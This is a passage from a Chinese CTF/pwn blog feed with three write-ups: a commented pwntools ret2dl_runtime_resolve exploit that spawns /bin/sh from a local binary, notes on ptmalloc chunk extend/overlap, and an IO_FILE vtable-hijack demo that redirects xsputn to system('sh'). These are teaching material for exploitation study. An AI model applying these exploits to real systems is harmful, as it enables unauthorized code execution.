class="line-numbers-rows"><span></span></span></code></pre><p>利用流程概述：<br>1.劫持程序执行流到read输入数据到bss段<br>2.用rop修改ebp的方法再次劫持执行流（这个有空单写一篇blog说明下）<br>3.劫持执行流到dl_runtime_resolve函数的push第二个参数处。设置栈中的第一个参数伪造合适的三个结构。<br>需要注意的一点是最后会把read函数got表写入为system函数的地址，但是劫持程序执行流的是dl_euntime_resolve函数返回的时候调用的搜索到的system函数。<br>exp做了详细注释</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">coding</span><span class="token expression"><span class="token operator">=</span>utf<span class="token operator">-</span><span class="token number">8</span></span></span>from pwn import <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>p<span class="token operator">=</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token char">'./fun'</span><span class="token punctuation">)</span>pop_ebp_ret<span class="token operator">=</span><span class="token number">0x080484ab</span>leave_ret<span class="token operator">=</span><span class="token number">0x08048378</span>pppr<span class="token operator">=</span><span class="token number">0x080484a9</span>fake_stack_size<span class="token operator">=</span><span class="token number">0x800</span>bss<span class="token operator">=</span><span class="token number">0x0804a01c</span>read_plt<span class="token operator">=</span><span class="token number">0x080482e0</span>read_got<span class="token operator">=</span><span class="token number">0x0804a00c</span>bss_stage<span class="token operator">=</span>bss<span class="token operator">+</span>fake_stack_sizedynsym<span class="token operator">=</span><span class="token number">0x080481cc</span> #真正dynsym的开始地址dynstr<span class="token operator">=</span><span class="token number">0x0804821c</span>plt<span class="token operator">=</span><span class="token number">0x080482d0</span>    #push ptr<span class="token punctuation">[</span>address<span class="token punctuation">]</span> _dll_run_rime_resolve的第二个参数开始入栈relplt<span class="token operator">=</span><span class="token number">0x08048298</span>  #真正read_rel<span class="token punctuation">.</span>plt的开始地址rel_offset<span class="token operator">=</span>bss_stage<span class="token operator">+</span><span class="token number">28</span><span class="token operator">-</span>relplt  #<span class="token number">7</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">=</span><span class="token number">28</span> 指向fake_<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>pltfake_sym_addr<span class="token operator">=</span>bss_stage<span class="token operator">+</span><span class="token number">36</span>  #伪造<span class="token punctuation">.</span>dynsym结构的开始align<span class="token operator">=</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span> #为了<span class="token number">16</span>字节对齐print <span class="token char">'align==>'</span><span class="token operator">+</span><span class="token function">hex</span><span class="token punctuation">(</span>align<span class="token punctuation">)</span>fake_sym_addr<span class="token operator">=</span>fake_sym_addr<span class="token operator">+</span>align index<span class="token operator">=</span><span class="token punctuation">(</span>fake_sym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> #<span class="token punctuation">.</span>dynamic结构的大小为<span class="token number">0x10</span>print <span class="token char">'index==>'</span><span class="token operator">+</span><span class="token function">hex</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>r_info<span class="token operator">=</span><span class="token punctuation">(</span>index<span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>  #<span class="token number">0x7</span>是属性位，导入函数都是<span class="token number">0x07</span>print <span class="token char">'r_info==>'</span><span class="token operator">+</span><span class="token function">hex</span><span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>fake_raloc<span class="token operator">=</span><span class="token function">p32</span><span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>#导入函数符号表在<span class="token punctuation">.</span>dynamic中的下标st_name<span class="token operator">=</span>fake_sym_addr<span class="token operator">-</span>dynstr<span class="token operator">+</span><span class="token number">16</span> # <span class="token punctuation">.</span>dynstr到字符串system的偏移fake_sym<span class="token operator">=</span><span class="token function">p32</span><span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span> #st_name是符号名相对于dynstr的偏移，<span class="token number">0x12</span>是固定的<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">gdb</span><span class="token expression"><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>payload<span class="token operator">=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token number">44</span>payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>#调用read函数向bss段写入数据payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>pppr<span class="token punctuation">)</span>#read函数返回到这里用来平衡堆栈payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span> #第二次输入的地址是bss_stagepayload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>pop_ebp_ret<span class="token punctuation">)</span>#set ebp to bss<span class="token operator">+</span><span class="token number">0x800</span>  这里设置ebp为bss_stagepayload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span>payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>#把ebp<span class="token operator">+</span><span class="token number">4</span>指向的内容赋值给esp然后执行<span class="token function">ret</span><span class="token punctuation">(</span>又一次劫持程序执行流到bss_stage<span class="token operator">+</span><span class="token number">4</span>指向的内容<span class="token punctuation">)</span>   mov esp ebp<span class="token punctuation">,</span>pop ebpp<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token function">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span><span class="token char">'/bin/sh'</span>payload<span class="token operator">=</span><span class="token char">'aaaa'</span>payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>plt<span class="token punctuation">)</span> #执行完上面的leave_ret会执行这里 payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>rel_offset<span class="token punctuation">)</span> #dll_run_time_resolve函数的第二个参数（要调用导入函数<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt中的偏移）payload<span class="token operator">+=</span><span class="token char">'aaaa'</span>payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>bss_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>  #这里是参数（当一个函数需要被延迟绑定的时候会调用dll_run_time_resolve函数这是这个函数的参数）payload<span class="token operator">+=</span><span class="token char">'aaaa'</span>payload<span class="token operator">+=</span><span class="token char">'aaaa'</span>payload<span class="token operator">+=</span>fake_raloc   #fake_<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>pltpayload<span class="token operator">+=</span><span class="token char">'a'</span><span class="token operator">*</span>alignpayload<span class="token operator">+=</span>fake_sym    #fake_<span class="token punctuation">.</span>dynsympayload<span class="token operator">+=</span><span class="token char">'system\0'</span>payload<span class="token operator">+=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token function">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>binsh<span class="token operator">+</span><span class="token char">'\x00'</span>  #放入字符串<span class="token operator">/</span>bin<span class="token operator">/</span>shpayload<span class="token operator">+=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token function">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>提供了一种没有函数创造函数的方法。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-overlap(1)</title>
      <link href="//post/pwn-overlap-1.html"/>
      <url>//post/pwn-overlap-1.html</url>
      
        <content type="html"><![CDATA[<h1 id="extend-和-overlap"><a href="#extend-和-overlap" class="headerlink" title="extend 和 overlap"></a>extend 和 overlap</h1><p>之前学习过extend和overlap，但一直不能灵活使用，趁现在有空系统的复习下并尝试做几道题</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Get size, ignoring use bits */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">chunksize</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">chunksize_nomask</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>SIZE_BITS<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">chunksize_nomask</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-></span>mchunk_size<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Ptr to next physical malloc_chunk. */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">next_chunk</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即使用当前块指针加上当前块大小。</p><p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">prev_size</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">-></span>mchunk_prev_size<span class="token punctuation">)</span></span></span><span class="token comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">prev_chunk</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">prev_size</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">inuse</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span>mchunk_size<span class="token punctuation">)</span> <span class="token operator">&amp;</span> PREV_INUSE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p>chekcsec </p><p><img src="https://pic.imgdb.cn/item/60f2b5615132923bf813f989.jpg"></p><p>主要功能</p><p><img src="https://pic.imgdb.cn/item/60f2b5865132923bf814a4ab.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-IO_FILE-伪造vtable</title>
      <link href="//post/pwn-IO-FILE-%E4%BC%AA%E9%80%A0vtable.html"/>
      <url>//post/pwn-IO-FILE-%E4%BC%AA%E9%80%A0vtable.html</url>
      
        <content type="html"><![CDATA[<h1 id="IO-FILE-伪造vtable"><a href="#IO-FILE-伪造vtable" class="headerlink" title="IO_FILE 伪造vtable"></a>IO_FILE 伪造vtable</h1><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>上一篇文章系统总结了下 Linux 中文件流的特性（FILE），可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p><p>因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p><p>因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向可以控制的内存，然后在其中布置函数指针。</p><p>本文是基于libc 2.23及之前的libc上可实施的，libc2.24之后加入了vtable check机制，无法再构造vtable。</p><p>vtable是<code>_IO_FILE_plus</code>结构体里的一个字段，是一个函数表指针，里面存储着许多和IO相关的函数。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>_IO_FILE_plus</code>结构体的定义为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span><span class="token punctuation">&#123;</span>  _IO_FILE file<span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>vtable</code>对应的结构体<code>_IO_jump_t</code>的定义为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span><span class="token punctuation">&#123;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_pbackfail_t<span class="token punctuation">,</span> __pbackfail<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* showmany */</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsgetn_t<span class="token punctuation">,</span> __xsgetn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekoff_t<span class="token punctuation">,</span> __seekoff<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seekpos_t<span class="token punctuation">,</span> __seekpos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_setbuf_t<span class="token punctuation">,</span> __setbuf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_sync_t<span class="token punctuation">,</span> __sync<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_doallocate_t<span class="token punctuation">,</span> __doallocate<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_read_t<span class="token punctuation">,</span> __read<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_write_t<span class="token punctuation">,</span> __write<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_seek_t<span class="token punctuation">,</span> __seek<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_close_t<span class="token punctuation">,</span> __close<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_stat_t<span class="token punctuation">,</span> __stat<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_showmanyc_t<span class="token punctuation">,</span> __showmanyc<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_imbue_t<span class="token punctuation">,</span> __imbue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>    get_column<span class="token punctuation">;</span>    set_column<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如<code>fwrite</code>最终会调用<code>__write</code>函数、<code>fread</code>会调用<code>__doallocate</code>来分配IO缓冲区等。</p><p><strong>vtable劫持的原理是：如果能够控制FILE结构体，实现对vtable指针的修改，使得vtable指向可控的内存，在该内存中构造好vtable，再通过调用相应IO函数，触发vtable函数的调用，即可劫持程序执行流。</strong></p><p>从原理中可以看到，劫持最关键的点在于修改IO FILE结构体的vtable指针，指向可控内存。一般来说有两种方式：一种是只修改内存中已有FILE结构体的vtable字段；另一种则是伪造整个FILE结构体。当然，两种的本质最终都是修改了vtable字段。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，<strong>对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">system_ptr</span> <span class="token expression"><span class="token number">0x7ffff7a523a0</span><span class="token punctuation">;</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>vtable_addr<span class="token punctuation">,</span><span class="token operator">*</span>fake_vtable<span class="token punctuation">;</span>    fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"123.txt"</span><span class="token punctuation">,</span><span class="token string">"rw"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_vtable<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vtable_addr<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>fp<span class="token operator">+</span><span class="token number">0xd8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//vtable offset</span>    vtable_addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>fake_vtable<span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fake_vtable<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">=</span>system_ptr<span class="token punctuation">;</span> <span class="token comment">//xsputn</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"hi"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p><p>因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p><p>fwrite会调用xsputn，而xsputn在vtable中的第七个</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span> funcs<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   <span class="token number">1</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// "extra word"</span>   <span class="token number">2</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// DUMMY</span>   <span class="token number">3</span> exit<span class="token punctuation">,</span> <span class="token comment">// finish</span>   <span class="token number">4</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// overflow</span>   <span class="token number">5</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// underflow</span>   <span class="token number">6</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// uflow</span>   <span class="token number">7</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// pbackfail</span>      <span class="token number">8</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsputn  #printf</span>   <span class="token number">9</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// xsgetn</span>   <span class="token number">10</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekoff</span>   <span class="token number">11</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seekpos</span>   <span class="token number">12</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// setbuf</span>   <span class="token number">13</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// sync</span>   <span class="token number">14</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// doallocate</span>   <span class="token number">15</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// read</span>   <span class="token number">16</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// write</span>   <span class="token number">17</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// seek</span>   <span class="token number">18</span> pwn<span class="token punctuation">,</span>  <span class="token comment">// close</span>   <span class="token number">19</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// stat</span>   <span class="token number">20</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// showmanyc</span>   <span class="token number">21</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment">// imbue</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以修改vtable中的xsputn为system函数</p><p>同时因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递</p><pre class="line-numbers 